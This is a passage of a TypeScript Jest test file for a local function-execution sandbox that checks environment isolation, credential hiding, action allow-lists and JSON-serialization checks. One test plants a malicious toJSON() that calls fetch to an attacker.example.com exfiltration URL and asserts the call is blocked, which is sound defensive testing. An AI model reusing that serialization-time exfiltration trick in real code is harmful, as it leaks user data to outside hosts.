                    NODE_ENV: 'development',
                    TMPDIR: '/tmp',
                },
            });
        });

        test('Should restore the real process.env after execution, whether the function resolves or throws', async () => {
            process.env = { ...originalEnv, AWS_SECRET_ACCESS_KEY: 'super-secret-aws-key' };
            const realEnvSnapshot = { ...process.env };

            await executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                loadModuleReturning({ example: () => 'ok' }),
                mockLogger,
            );
            expect({ ...process.env }).toEqual(realEnvSnapshot);

            await expect(
                executeScriptLocally(
                    func,
                    TEST_PROJECT_ROOT,
                    [],
                    stubExecuteAction,
                    loadModuleReturning({
                        example: () => {
                            throw new Error('boom');
                        },
                    }),
                    mockLogger,
                ),
            ).rejects.toThrow('boom');
            expect({ ...process.env }).toEqual(realEnvSnapshot);
        });

        // Regression coverage: the action-catalog/backend-runtime registrations resolve real npm
        // package specifiers a customer project could itself declare — their own top-level code must
        // never see the real, unscoped environment, the same guarantee already proven for the
        // customer function itself above.
        test("Should never expose the dev server's own DD_API_KEY to the action-catalog package's own load-time code", async () => {
            process.env = { ...originalEnv, DD_API_KEY: 'the-dev-servers-own-api-key' };
            jest.spyOn(shared, 'isActionCatalogInstalled').mockReturnValue(true);

            let envSeenDuringRegistration: string | undefined;
            const loadModule: LoadModule = async (specifier: string) => {
                if (specifier === func.absolutePath + LOCAL_EXECUTION_LOAD_SUFFIX) {
                    return { example: () => 'ok' };
                }
                if (specifier === '@datadog/action-catalog/action-execution') {
                    envSeenDuringRegistration = process.env.DD_API_KEY;
                    return { setExecuteActionImplementation: () => {} };
                }
                const error: NodeJS.ErrnoException = new Error(`Cannot find module '${specifier}'`);
                error.code = 'MODULE_NOT_FOUND';
                throw error;
            };

            const result = await executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                loadModule,
                mockLogger,
            );

            expect(result).toEqual({ data: 'ok' });
            expect(envSeenDuringRegistration).toBeUndefined();
        });
    });

    test('Should preserve preview context fields while overriding invocation-owned args and Actions', async () => {
        const getRuntimeContext = async () => ({
            ...makePreviewRuntimeContext(),
            previewMetadata: { requestId: 'preview-request' },
            backendFunctionArgs: ['remote-placeholder'],
            Actions: 'remote-placeholder',
        });
        const result = await executeScriptLocallyWithRuntimeContext(
            func,
            TEST_PROJECT_ROOT,
            ['local-argument'],
            stubExecuteAction,
            getRuntimeContext,
            loadModuleReturning({
                example: () => {
                    const dollar = testDollar();
                    return {
                        args: dollar.backendFunctionArgs,
                        previewMetadata: dollar.previewMetadata,
                        actionsIsRemotePlaceholder: dollar.Actions === 'remote-placeholder',
                    };
                },
            }),
            mockLogger,
        );
        expect(result).toEqual({
            data: {
                args: ['local-argument'],
                previewMetadata: { requestId: 'preview-request' },
                actionsIsRemotePlaceholder: false,
            },
        });
    });

    test('Should never expose a credential-shaped field anywhere on $, not just inside $.Source', async () => {
        const result = await executeScriptLocally(
            func,
            TEST_PROJECT_ROOT,
            [],
            stubExecuteAction,
            loadModuleReturning({
                example: () => {
                    const CREDENTIAL_SUBSTRINGS = [
                        'token',
                        'secret',
                        'key',
                        'password',
                        'credential',
                    ];
                    const hasCredentialName = (key: string) =>
                        CREDENTIAL_SUBSTRINGS.some((substring) =>
                            key.toLowerCase().includes(substring),
                        );
                    // Recurses into every value, but never enumerates Actions itself (a Proxy dispatch
                    // mechanism, not a data container) — the preview response backing the rest of $ is
                    // validated only for Source's shape, so nothing else stops an unexpected field
                    // (present now or added later) from reaching it undetected.
                    const containsCredentialKey = (value: unknown): boolean =>
                        typeof value === 'object' &&
                        value !== null &&
                        Object.entries(value).some(
                            ([key, nested]) =>
                                hasCredentialName(key) || containsCredentialKey(nested),
                        );
                    const dollar = testDollar();
                    const { Actions: _actions, ...dollarWithoutActions } = dollar;
                    return (
                        Object.keys(globalThis).some(hasCredentialName) ||
                        containsCredentialKey(dollarWithoutActions)
                    );
                },
            }),
            mockLogger,
        );
        expect(result).toEqual({ data: false });
    });

    test('Should populate $.Source with the preview identity, reachable via globalThis.$', async () => {
        const result = await executeScriptLocally(
            func,
            TEST_PROJECT_ROOT,
            [],
            stubExecuteAction,
            loadModuleReturning({ example: () => testDollar().Source }),
            mockLogger,
        );
        expect(result).toEqual({
            data: {
                initiator: { id: 'preview-initiator', orgId: 'preview-org' },
                runAsUser: { id: 'preview-run-as', orgId: 'preview-org' },
            },
        });
    });

    test('Should reject malformed preview identity before loading the customer module', async () => {
        const loadModule = jest.fn();
        const getRuntimeContext = async () => ({
            Source: {
                initiator: { id: 'missing-org' },
                runAsUser: { id: 'run-as', orgId: 'preview-org' },
            },
        });

        await expect(
            executeScriptLocallyWithRuntimeContext(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                getRuntimeContext,
                loadModule,
                mockLogger,
            ),
        ).rejects.toThrow(
            'The preview runtime context Source.initiator must have a non-empty string "orgId" field.',
        );
        expect(loadModule).not.toHaveBeenCalled();
    });

    test("Should give each execution its own $.Source object, so one execution mutating it can't corrupt a later execution's identity", async () => {
        const first = await executeScriptLocally(
            func,
            TEST_PROJECT_ROOT,
            [],
            stubExecuteAction,
            loadModuleReturning({
                example: () => {
                    testDollar().Source.initiator.id = 'hacked';
                    return 'first done';
                },
            }),
            mockLogger,
        );
        expect(first).toEqual({ data: 'first done' });

        const second = await executeScriptLocally(
            func,
            TEST_PROJECT_ROOT,
            [],
            stubExecuteAction,
            loadModuleReturning({ example: () => testDollar().Source }),
            mockLogger,
        );
        expect(second).toEqual({
            data: {
                initiator: { id: 'preview-initiator', orgId: 'preview-org' },
                runAsUser: { id: 'preview-run-as', orgId: 'preview-org' },
            },
        });
    });

    test('Should allow a customer module to assign to globalThis.$ (e.g. importing zx/globals) without throwing', async () => {
        const result = await executeScriptLocally(
            func,
            TEST_PROJECT_ROOT,
            [],
            stubExecuteAction,
            loadModuleReturning({
                example: () => {
                    (globalThis as Record<string, unknown>).$ = { notOurs: true };
                    return 'done';
                },
            }),
            mockLogger,
        );
        expect(result).toEqual({ data: 'done' });
    });

    test('Should restore a pre-existing globalThis.$ (e.g. from zx/globals) once the execution completes, even if the customer function reassigned it', async () => {
        const preExisting = { notOurs: true };
        (globalThis as Record<string, unknown>).$ = preExisting;
        try {
            const result = await executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                loadModuleReturning({
                    example: () => {
                        (globalThis as Record<string, unknown>).$ = { reassigned: true };
                        return 'done';
                    },
                }),
                mockLogger,
            );
            expect(result).toEqual({ data: 'done' });
            expect(Object.is((globalThis as Record<string, unknown>).$, preExisting)).toBe(true);
        } finally {
            (globalThis as Record<string, unknown>).$ = undefined;
        }
    });

    test('Should seed the outside-execution slot from a globalThis.$ that already existed before this module was first loaded', () => {
        const originalDescriptor = Object.getOwnPropertyDescriptor(globalThis, '$');
        const preExisting = { fromZxGlobals: true };
        (globalThis as Record<string, unknown>).$ = preExisting;
        try {
            jest.isolateModules(() => {
                // A fresh module instance re-runs its top-level Object.defineProperty and must read the current $ (still `preExisting`) rather than start from an empty slot.
                require('./local-execution');
            });
            expect((globalThis as Record<string, unknown>).$).toBe(preExisting);
        } finally {
            if (originalDescriptor) {
                Object.defineProperty(globalThis, '$', originalDescriptor);
            }
        }
    });

    test('Should read globalThis.$ as undefined once the execution completes when nothing was defined before it started', async () => {
        (globalThis as Record<string, unknown>).$ = undefined;
        await executeScriptLocally(
            func,
            TEST_PROJECT_ROOT,
            [],
            stubExecuteAction,
            loadModuleReturning({ example: () => 'done' }),
            mockLogger,
        );
        expect((globalThis as Record<string, unknown>).$).toBeUndefined();
    });

    test("Should not leak one execution's globalThis.$ override into a later, separately-queued execution", async () => {
        await executeScriptLocally(
            func,
            TEST_PROJECT_ROOT,
            [],
            stubExecuteAction,
            loadModuleReturning({
                example: () => {
                    (globalThis as Record<string, unknown>).$ = { fromFirstExecution: true };
                    return 'first';
                },
            }),
            mockLogger,
        );

        const second = await executeScriptLocally(
            func,
            TEST_PROJECT_ROOT,
            [],
            stubExecuteAction,
            loadModuleReturning({
                example: () => Object.keys(testDollar()).sort(),
            }),
            mockLogger,
        );
        expect(second).toEqual({ data: ['Actions', 'Source', 'backendFunctionArgs'] });
    });

    describe('action-catalog / apps-backend registration', () => {
        test('Should silently skip registration when neither package is installed', async () => {
            // Confirms loadModuleReturning's rejection of other specifiers doesn't surface as an execution failure.
            const result = await executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                loadModuleReturning({ example: () => 'fine' }),
                mockLogger,
            );
            expect(result).toEqual({ data: 'fine' });
        });

        test('Should pick up action-catalog on the very next execution after it becomes installed mid-session, not stay permanently skipped', async () => {
            const isInstalledSpy = jest
                .spyOn(shared, 'isActionCatalogInstalled')
                .mockReturnValue(false);
            let registeredImpl:
                | ((actionId: string, request: unknown) => Promise<unknown>)
                | undefined;
            const loadModule: LoadModule = async (specifier: string) => {
                if (specifier === func.absolutePath + LOCAL_EXECUTION_LOAD_SUFFIX) {
                    return { example: () => 'fine' };
                }
                if (specifier === '@datadog/action-catalog/action-execution') {
                    return {
                        setExecuteActionImplementation: (
                            impl: (actionId: string, request: unknown) => Promise<unknown>,
                        ) => {
                            registeredImpl = impl;
                        },
                    };
                }
                const error: NodeJS.ErrnoException = new Error(`Cannot find module '${specifier}'`);
                error.code = 'MODULE_NOT_FOUND';
                throw error;
            };

            // Not installed yet — registration is skipped, same as the "neither package installed" case.
            await executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                loadModule,
                mockLogger,
            );
            expect(registeredImpl).toBeUndefined();

            // Simulates a mid-session install — the very next execution must register it, not stay skipped from the earlier uncached check.
            isInstalledSpy.mockReturnValue(true);
            await executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                loadModule,
                mockLogger,
            );
            expect(registeredImpl).toBeDefined();
        });

        test('Should reuse the cached action-catalog registration across executions that share the same loadModule reference, even when each passes a different primedEntry — matching dev-server.ts, which threads one stable loadModule but a fresh per-request primed module', async () => {
            jest.spyOn(shared, 'isActionCatalogInstalled').mockReturnValue(true);
            let actionCatalogLoadCount = 0;
            const loadModule: LoadModule = async (specifier: string) => {
                if (specifier === '@datadog/action-catalog/action-execution') {
                    actionCatalogLoadCount += 1;
                    return { setExecuteActionImplementation: () => {} };
                }
                const error: NodeJS.ErrnoException = new Error(`Cannot find module '${specifier}'`);
                error.code = 'MODULE_NOT_FOUND';
                throw error;
            };

            const first = await executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                loadModule,
                mockLogger,
                undefined,
                { example: () => 'first' },
            );
            const second = await executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                loadModule,
                mockLogger,
                undefined,
                { example: () => 'second' },
            );

            expect(first).toEqual({ data: 'first' });
            expect(second).toEqual({ data: 'second' });
            expect(actionCatalogLoadCount).toBe(1);
        });

        test('Should propagate a real load failure from an installed action-catalog package, not treat it as absent', async () => {
            jest.spyOn(shared, 'isActionCatalogInstalled').mockReturnValue(true);
            const loadModule: LoadModule = async (specifier: string) => {
                if (specifier === func.absolutePath + LOCAL_EXECUTION_LOAD_SUFFIX) {
                    return { example: () => 'unreachable' };
                }
                if (specifier === '@datadog/action-catalog/action-execution') {
                    // A real transform/evaluation failure, not a module-not-found error — must not be swallowed as "not installed".
                    throw new Error('Unexpected token in action-catalog/action-execution');
                }
                const error: NodeJS.ErrnoException = new Error(`Cannot find module '${specifier}'`);
                error.code = 'MODULE_NOT_FOUND';
                throw error;
            };

            await expect(
                executeScriptLocally(
                    func,
                    TEST_PROJECT_ROOT,
                    [],
                    stubExecuteAction,
                    loadModule,
                    mockLogger,
                ),
            ).rejects.toThrow('Unexpected token in action-catalog/action-execution');
        });

        // The sibling registration failing doesn't affect this adapter — it's stable and execution-agnostic, so it rejects on its own once no execution is active.
        test('Should still reject a typed-wrapper call through a successfully-registered action-catalog implementation after the sibling apps-backend registration genuinely fails and the execution concludes', async () => {
            jest.spyOn(shared, 'isActionCatalogInstalled').mockReturnValue(true);
            jest.spyOn(shared, 'isDatadogAppsBackendInstalled').mockReturnValue(true);
            let registeredImpl:
                | ((actionId: string, request: unknown) => Promise<unknown>)
                | undefined;

            const loadModule: LoadModule = async (specifier: string) => {
                if (specifier === func.absolutePath + LOCAL_EXECUTION_LOAD_SUFFIX) {
                    return { example: () => 'unreachable' };
                }
                if (specifier === '@datadog/action-catalog/action-execution') {
                    return {
                        setExecuteActionImplementation: (
                            impl: (actionId: string, request: unknown) => Promise<unknown>,
                        ) => {
                            registeredImpl = impl;
                        },
                    };
                }
                if (specifier === '@datadog/apps-backend/runtime/jsFunctionWithActions') {
                    // A real transform/evaluation failure, not module-not-found — must not be swallowed as "package isn't installed".
                    throw new Error(
                        'Unexpected token in apps-backend/runtime/jsFunctionWithActions',
                    );
                }
                const error: NodeJS.ErrnoException = new Error(`Cannot find module '${specifier}'`);
                error.code = 'MODULE_NOT_FOUND';
                throw error;
            };

            await expect(
                executeScriptLocally(
                    func,
                    TEST_PROJECT_ROOT,
                    [],
                    stubExecuteAction,
                    loadModule,
                    mockLogger,
                ),
            ).rejects.toThrow('Unexpected token in apps-backend/runtime/jsFunctionWithActions');

            expect(registeredImpl).toBeDefined();
            await expect(
                registeredImpl?.('com.datadoghq.slack.chat.postMessage', { inputs: {} }),
            ).rejects.toThrow(/no active local execution/i);
        });

        test('Should route an action-catalog typed-wrapper call through the same injected executeAction', async () => {
            jest.spyOn(shared, 'isActionCatalogInstalled').mockReturnValue(true);
            const executeAction = jest.fn().mockResolvedValue({ ok: true });
            let registeredImpl:
                | ((actionId: string, request: unknown) => Promise<unknown>)
                | undefined;

            const loadModule: LoadModule = async (specifier: string) => {
                if (specifier === func.absolutePath + LOCAL_EXECUTION_LOAD_SUFFIX) {
                    return {
                        example: async () =>
                            registeredImpl?.('com.datadoghq.slack.chat.postMessage', {
                                inputs: { text: 'hi' },
                                connectionId: 'conn-1',
                            }),
                    };
                }
                if (specifier === '@datadog/action-catalog/action-execution') {
                    return {
                        setExecuteActionImplementation: (
                            impl: (actionId: string, request: unknown) => Promise<unknown>,
                        ) => {
                            registeredImpl = impl;
                        },
                    };
                }
                const error: NodeJS.ErrnoException = new Error(`Cannot find module '${specifier}'`);
                error.code = 'MODULE_NOT_FOUND';
                throw error;
            };

            const result = await executeScriptLocally(
                funcWithConnection,
                TEST_PROJECT_ROOT,
                [],
                executeAction,
                loadModule,
                mockLogger,
            );
            expect(result).toEqual({ data: { ok: true } });
            expect(executeAction).toHaveBeenCalledWith(
                'com.datadoghq.slack.chat.postMessage',
                { text: 'hi' },
                'conn-1',
            );
        });

        test("Should reject an action-catalog typed-wrapper call whose connectionId isn't in the function's allowedConnectionIds", async () => {
            jest.spyOn(shared, 'isActionCatalogInstalled').mockReturnValue(true);
            const executeAction = jest.fn().mockResolvedValue({ ok: true });
            let registeredImpl:
                | ((actionId: string, request: unknown) => Promise<unknown>)
                | undefined;

            const loadModule: LoadModule = async (specifier: string) => {
                if (specifier === func.absolutePath + LOCAL_EXECUTION_LOAD_SUFFIX) {
                    return {
                        example: async () =>
                            registeredImpl?.('com.datadoghq.slack.chat.postMessage', {
                                inputs: { text: 'hi' },
                                connectionId: 'conn-not-allowed',
                            }),
                    };
                }
                if (specifier === '@datadog/action-catalog/action-execution') {
                    return {
                        setExecuteActionImplementation: (
                            impl: (actionId: string, request: unknown) => Promise<unknown>,
                        ) => {
                            registeredImpl = impl;
                        },
                    };
                }
                const error: NodeJS.ErrnoException = new Error(`Cannot find module '${specifier}'`);
                error.code = 'MODULE_NOT_FOUND';
                throw error;
            };

            await expect(
                executeScriptLocally(
                    func,
                    TEST_PROJECT_ROOT,
                    [],
                    executeAction,
                    loadModule,
                    mockLogger,
                ),
            ).rejects.toThrow(/not in this function's allowed connections/);
            expect(executeAction).not.toHaveBeenCalled();
        });

        test('Should reject an action-catalog typed-wrapper call missing an inputs field, same as a raw $.Actions call', async () => {
            jest.spyOn(shared, 'isActionCatalogInstalled').mockReturnValue(true);
            const executeAction = jest.fn().mockResolvedValue({ ok: true });
            let registeredImpl:
                | ((actionId: string, request: unknown) => Promise<unknown>)
                | undefined;

            const loadModule: LoadModule = async (specifier: string) => {
                if (specifier === func.absolutePath + LOCAL_EXECUTION_LOAD_SUFFIX) {
                    return {
                        example: async () =>
                            registeredImpl?.('com.datadoghq.slack.chat.postMessage', {
                                connectionId: 'conn-1',
                            }),
                    };
                }
                if (specifier === '@datadog/action-catalog/action-execution') {
                    return {
                        setExecuteActionImplementation: (
                            impl: (actionId: string, request: unknown) => Promise<unknown>,
                        ) => {
                            registeredImpl = impl;
                        },
                    };
                }
                const error: NodeJS.ErrnoException = new Error(`Cannot find module '${specifier}'`);
                error.code = 'MODULE_NOT_FOUND';
                throw error;
            };

            await expect(
                executeScriptLocally(
                    func,
                    TEST_PROJECT_ROOT,
                    [],
                    executeAction,
                    loadModule,
                    mockLogger,
                ),
            ).rejects.toThrow(/must have an inputs field/);
            expect(executeAction).not.toHaveBeenCalled();
        });

        // Mirrors the raw $.Actions path's malicious-toJSON() test — the action-catalog typed-wrapper path needed its own serialize-before-runAllowed fix since it doesn't share code with makeActionsProxy.
        test("Should block a malicious toJSON() on an action-catalog typed-wrapper call's request from making a real network call under cover of the exemption", async () => {
            jest.spyOn(shared, 'isActionCatalogInstalled').mockReturnValue(true);
            let registeredImpl:
                | ((actionId: string, request: unknown) => Promise<unknown>)
                | undefined;
            let fetchAttempt: Promise<unknown> | undefined;
            const maliciousRequest = {
                inputs: {
                    text: 'hi',
                    toJSON() {
                        fetchAttempt = fetch('https://attacker.example.com/exfiltrate');
                        return { text: 'hi' };
                    },
                },
                connectionId: 'conn-1',
            };

            const loadModule: LoadModule = async (specifier: string) => {
                if (specifier === func.absolutePath + LOCAL_EXECUTION_LOAD_SUFFIX) {
                    return {
                        example: async () =>
                            registeredImpl?.(
                                'com.datadoghq.slack.chat.postMessage',
                                maliciousRequest,
                            ),
                    };
                }
                if (specifier === '@datadog/action-catalog/action-execution') {
                    return {
                        setExecuteActionImplementation: (
                            impl: (actionId: string, request: unknown) => Promise<unknown>,
                        ) => {
                            registeredImpl = impl;
                        },
                    };
                }
                const error: NodeJS.ErrnoException = new Error(`Cannot find module '${specifier}'`);
                error.code = 'MODULE_NOT_FOUND';
                throw error;
            };

            const result = await executeScriptLocally(
                funcWithConnection,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                loadModule,
                mockLogger,
            );

            expect(result).toEqual({ data: { data: null, stub: true, fqn: expect.any(String) } });
            expect(fetchAttempt).toBeDefined();
            await expect(fetchAttempt).rejects.toThrow(/Network access is not allowed/);
        });

        // Mirrors the action-catalog abandonment test — apps-backend's setBackend has the same shared-module-level-setter hazard.
        test("Should reject an abandoned execution's apps-backend accessor call once concluded", async () => {
            jest.spyOn(shared, 'isDatadogAppsBackendInstalled').mockReturnValue(true);
            let abandonedCallOutcome: 'pending' | 'resolved' | { rejected: string } = 'pending';
            let registeredBackend: { get: () => unknown } | undefined;

            const loadModule: LoadModule = async (specifier: string) => {
                if (specifier === func.absolutePath + LOCAL_EXECUTION_LOAD_SUFFIX) {
                    return {
                        example: async () => {
                            await new Promise((resolve) => setTimeout(resolve, 100));
                            try {
                                registeredBackend?.get();
                                abandonedCallOutcome = 'resolved';
                            } catch (err) {
                                abandonedCallOutcome = {
                                    rejected: err instanceof Error ? err.message : String(err),
                                };
                            }
                            return { data: 'abandoned' };
                        },
                    };
                }
                if (specifier === '@datadog/apps-backend/runtime/jsFunctionWithActions') {
                    return {
                        // Mirrors the real package's synchronous $.Source validation, so a poisoned proxy passed through here fails the same way.
                        buildRuntimeFromJsFunctionWithActions: ($: unknown) => {
                            const source = ($ as Record<string, unknown>).Source as
                                | { initiator?: unknown }
                                | undefined;
                            if (!source || typeof source.initiator !== 'object') {
                                throw new Error(
                                    'Invalid $.Source supplied to buildRuntimeFromJsFunctionWithActions',
                                );
                            }
                            return { get: () => source };
                        },
                    };
                }
                if (specifier === '@datadog/apps-backend/runtime') {
                    return {
                        setBackend: (runtime: { get: () => unknown }) => {
                            registeredBackend = runtime;
                        },
                    };
                }
                const notFoundError: NodeJS.ErrnoException = new Error(
                    `Cannot find module '${specifier}'`,
                );
                notFoundError.code = 'MODULE_NOT_FOUND';
                throw notFoundError;
            };

            const abandoned = executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                loadModule,
                mockLogger,
                20,
            );
            await expect(abandoned).rejects.toThrow(/timed out after 20ms/);

            await new Promise((resolve) => setTimeout(resolve, 100));

            expect(abandonedCallOutcome).toEqual({
                rejected: expect.stringContaining('already concluded'),
            });
        });

        // A flat method reading its own internal state via `this` (a real, common accessor
        // pattern) must still work when called through the backend-runtime proxy — not just
        // arrow-function methods that close over data instead, which every other test here uses.
        test('Should preserve `this` when a flat apps-backend runtime method reads its own internal state', async () => {
            jest.spyOn(shared, 'isDatadogAppsBackendInstalled').mockReturnValue(true);
            let registeredBackend: { getUserId(): string } | undefined;
            let capturedUserId: unknown;

            const loadModule: LoadModule = async (specifier: string) => {
                if (specifier === func.absolutePath + LOCAL_EXECUTION_LOAD_SUFFIX) {
                    return {
                        example: () => {
                            capturedUserId = registeredBackend?.getUserId();
                            return 'done';
                        },
                    };
                }
                if (specifier === '@datadog/apps-backend/runtime/jsFunctionWithActions') {
                    return {
                        buildRuntimeFromJsFunctionWithActions: () => ({
                            userId: 'real-user-id',
                            // A real accessor pattern: reads its own instance state via `this`,
                            // not a closure — throws if called unbound.
                            getUserId() {
                                if (
                                    !this ||
                                    typeof (this as { userId?: unknown }).userId !== 'string'
                                ) {
                                    throw new Error('getUserId called with no `this`');
                                }
                                return (this as { userId: string }).userId;
                            },
                        }),
                    };
                }
                if (specifier === '@datadog/apps-backend/runtime') {
                    return {
                        setBackend: (runtime: { getUserId(): string }) => {
                            registeredBackend = runtime;
                        },
                    };
                }
                const notFoundError: NodeJS.ErrnoException = new Error(
                    `Cannot find module '${specifier}'`,
                );
                notFoundError.code = 'MODULE_NOT_FOUND';
                throw notFoundError;
            };

            const result = await executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                loadModule,
                mockLogger,
            );

            expect(result).toEqual({ data: 'done' });
            expect(capturedUserId).toBe('real-user-id');
        });
    });

    describe('non-serializable results', () => {
        test('Should reject with a clear, attributed error when the result has a circular reference', async () => {
            await expect(
                executeScriptLocally(
                    func,
                    TEST_PROJECT_ROOT,
                    [],
                    stubExecuteAction,
                    loadModuleReturning({
                        example: () => {
                            const o: Record<string, unknown> = {};
                            o.self = o;
                            return o;
                        },
                    }),
                    mockLogger,
                ),
            ).rejects.toThrow(/example.*can't be serialized to JSON/);
        });

        test('Should reject with a clear, attributed error when the result contains a BigInt', async () => {
            await expect(
                executeScriptLocally(
                    func,
                    TEST_PROJECT_ROOT,
                    [],
                    stubExecuteAction,
                    loadModuleReturning({ example: () => BigInt(10) }),
                    mockLogger,
                ),
            ).rejects.toThrow(/example.*can't be serialized to JSON/);
        });

        test('Should reject with a clear, attributed error when the result is a bare function (silently dropped by JSON.stringify)', async () => {
            await expect(
                executeScriptLocally(
                    func,
                    TEST_PROJECT_ROOT,
                    [],
                    stubExecuteAction,
                    loadModuleReturning({ example: () => function notSerializable() {} }),
                    mockLogger,
                ),
            ).rejects.toThrow(/example.*JSON.stringify silently drops/);
        });

        test('Should reject with a clear, attributed error when the result is a Map (silently flattened to "{}" by JSON.stringify)', async () => {
            await expect(
                executeScriptLocally(
                    func,
                    TEST_PROJECT_ROOT,
                    [],
                    stubExecuteAction,
                    loadModuleReturning({ example: () => new Map([['a', 1]]) }),
                    mockLogger,
                ),
            ).rejects.toThrow(/example.*silently flattens/);
        });

        test('Should reject with a clear, attributed error when the result is a Set (silently flattened to "{}" by JSON.stringify)', async () => {
            await expect(
                executeScriptLocally(
                    func,
                    TEST_PROJECT_ROOT,
                    [],
                    stubExecuteAction,
                    loadModuleReturning({ example: () => new Set([1, 2, 3]) }),
                    mockLogger,
                ),
            ).rejects.toThrow(/example.*silently flattens/);
        });

        test('Should reject with a clear, attributed error when the result is NaN (silently converted to "null" by JSON.stringify)', async () => {
            await expect(
                executeScriptLocally(
                    func,
                    TEST_PROJECT_ROOT,
                    [],
                    stubExecuteAction,
                    loadModuleReturning({ example: () => NaN }),
                    mockLogger,
                ),
            ).rejects.toThrow(/example.*silently converts to "null"/);
        });

        test('Should reject with a clear, attributed error when the result is Infinity (silently converted to "null" by JSON.stringify)', async () => {
            await expect(
                executeScriptLocally(
                    func,
                    TEST_PROJECT_ROOT,
                    [],
                    stubExecuteAction,
                    loadModuleReturning({ example: () => Infinity }),
                    mockLogger,
                ),
            ).rejects.toThrow(/example.*silently converts to "null"/);
        });

        test('Should reject a Map nested inside a plain object, not just at the top level', async () => {
            await expect(
                executeScriptLocally(
                    func,
                    TEST_PROJECT_ROOT,
                    [],
                    stubExecuteAction,
                    loadModuleReturning({ example: () => ({ data: new Map([['a', 1]]) }) }),
                    mockLogger,
                ),
            ).rejects.toThrow(/example.*silently flattens/);
        });

        test('Should reject a Set nested inside an array, not just at the top level', async () => {
            await expect(
                executeScriptLocally(
                    func,
                    TEST_PROJECT_ROOT,
                    [],
                    stubExecuteAction,
                    loadModuleReturning({ example: () => [1, new Set([1, 2, 3])] }),
                    mockLogger,
                ),
            ).rejects.toThrow(/example.*silently flattens/);
        });

        test('Should reject a NaN nested inside a plain object, not just at the top level', async () => {
            await expect(
                executeScriptLocally(
                    func,
                    TEST_PROJECT_ROOT,
                    [],
                    stubExecuteAction,
                    loadModuleReturning({ example: () => ({ score: NaN }) }),
                    mockLogger,
                ),
            ).rejects.toThrow(/example.*silently converts to "null"/);
        });

        test('Should reject a function nested inside a plain object, not just at the top level', async () => {
            await expect(
                executeScriptLocally(
                    func,
                    TEST_PROJECT_ROOT,
                    [],
                    stubExecuteAction,
                    loadModuleReturning({ example: () => ({ status: 'ok', callback: () => {} }) }),
                    mockLogger,
                ),
            ).rejects.toThrow(/example.*JSON.stringify silently drops/);
        });

        test('Should reject a Symbol-keyed property, which JSON.stringify silently omits with no replacer call at all', async () => {
            const secretSymbol = Symbol('secret');
            await expect(
                executeScriptLocally(
                    func,
                    TEST_PROJECT_ROOT,
                    [],
                    stubExecuteAction,
                    loadModuleReturning({
                        example: () => ({ status: 'ok', [secretSymbol]: 'leaked' }),
                    }),
                    mockLogger,
                ),
            ).rejects.toThrow(/example.*Symbol-keyed property/);
        });

        test('Should reject a Symbol-keyed property nested inside an array, not just at the top level', async () => {
            const secretSymbol = Symbol('secret');
            await expect(
                executeScriptLocally(
                    func,
                    TEST_PROJECT_ROOT,
                    [],
                    stubExecuteAction,
                    loadModuleReturning({ example: () => [{ [secretSymbol]: 'leaked' }] }),
                    mockLogger,
                ),
            ).rejects.toThrow(/example.*Symbol-keyed property/);
        });

        // A pre-stringify scan of the original value would miss this: toJSON() only runs during
        // JSON.stringify itself, so the symbol-keyed object it returns must be checked where the
        // replacer actually sees it, not on the value returned from the customer function.
        test('Should reject a Symbol-keyed property introduced only by a custom toJSON(), not present on the original value', async () => {
            const secretSymbol = Symbol('secret');
            await expect(
                executeScriptLocally(
                    func,
                    TEST_PROJECT_ROOT,
                    [],
                    stubExecuteAction,
                    loadModuleReturning({
                        example: () => ({
                            status: 'ok',
                            toJSON: () => ({ replaced: true, [secretSymbol]: 'leaked' }),
                        }),
                    }),
                    mockLogger,
                ),
            ).rejects.toThrow(/example.*Symbol-keyed property/);
        });

        // Production's own HTTP serialization of a function's return value already silently omits
        // an undefined-valued object property rather than erroring, so local execution must match.
        test('Should silently omit an undefined nested inside a plain object from the return value, matching production, not just at the top level', async () => {
            const result = await executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                loadModuleReturning({ example: () => ({ status: 'ok', extra: undefined }) }),
                mockLogger,
            );
            expect(result).toEqual({ data: { status: 'ok' } });
        });

        test('Should silently omit an undefined at a property literally named the empty string, not mistake it for the JSON root', async () => {
            const result = await executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                loadModuleReturning({ example: () => ({ '': undefined, other: 'ok' }) }),
                mockLogger,
            );
            expect(result).toEqual({ data: { other: 'ok' } });
        });

        test('Should reject a function at a property literally named the empty string, not mistake it for the JSON root', async () => {
            await expect(
                executeScriptLocally(
                    func,
                    TEST_PROJECT_ROOT,
                    [],
                    stubExecuteAction,
                    loadModuleReturning({ example: () => ({ '': () => {}, other: 'ok' }) }),
                    mockLogger,
                ),
            ).rejects.toThrow(/example.*JSON.stringify silently drops/);
        });

        test('Should reject a Symbol nested inside an array, not just at the top level', async () => {
            await expect(
                executeScriptLocally(
                    func,
                    TEST_PROJECT_ROOT,
                    [],
                    stubExecuteAction,
                    loadModuleReturning({ example: () => [1, Symbol('unsupported')] }),
                    mockLogger,
                ),
            ).rejects.toThrow(/example.*symbol inside an array.*silently converts to null/);
        });

        // Unlike an object property, JSON.stringify silently converts an array element's undefined
        // to null instead of dropping it — real corruption, so this must still be caught.
        test('Should reject an undefined nested inside an array of the return value, instead of silently sending null', async () => {
            await expect(
                executeScriptLocally(
                    func,
                    TEST_PROJECT_ROOT,
                    [],
                    stubExecuteAction,
                    loadModuleReturning({ example: () => [1, undefined, 2] }),
                    mockLogger,
                ),
            ).rejects.toThrow(/example.*undefined inside an array.*silently converts to null/);
        });

        test('Should allow an explicit undefined result through unchanged', async () => {
            const result = await executeScriptLocally(
                func,
